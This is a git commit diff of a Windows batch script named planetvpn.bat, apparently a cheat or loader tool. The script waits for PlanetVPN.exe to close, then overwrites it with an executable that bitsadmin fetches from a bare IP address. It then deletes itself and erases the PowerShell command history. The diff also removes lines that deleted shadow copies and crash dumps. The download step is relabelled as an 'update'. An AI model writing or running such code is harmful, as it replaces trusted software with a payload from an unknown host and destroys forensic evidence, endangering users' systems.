811d20f8257eec076e4cefc2a5575dbdd3d11ec6
svdsaymazz <svdsaymaz@gmail.com>
2025-05-27 01:09:09 +0300

    planetvpn.bat

--- planetvpn.bat
+++ planetvpn.bat
@@ -1,5 +1,5 @@
 @echo off
-echo bekleyin...
+echo eger boyle kaldiysa gorev yoneticisinden hile exesini kapatin ve bekleyin...
 
 :loop
 tasklist | find /i "PlanetVPN.exe" >nul
@@ -8,10 +8,7 @@ if not errorlevel 1 (
     goto loop
 )
 
-echo Deleting existing...
-del /f "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"
-
-echo oPlanetVPN.exe...
+echo Updating PlanetVPN.exe...
 bitsadmin /transfer myDownloadJob /download /priority high https://31.57.156.199/PlanetVPN.exe "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"
 
 if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
@@ -28,10 +25,6 @@ if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
     } else { Write-Host 'Dosya bulunamadı: $filePath' }"
 
     echo Cleaning up...
-    echo Y | vssadmin delete shadows /for=C: /oldest >nul 2>&1
-    del /f /q "%USERPROFILE%\AppData\Local\CrashDumps\PlanetVPN.exe.*.dmp" 2>nul
-    rem rmdir /s /q "%APPDATA%\Microsoft\Windows\Recent"
-    rem mkdir "%APPDATA%\Microsoft\Windows\Recent"
     powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
     powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
 )
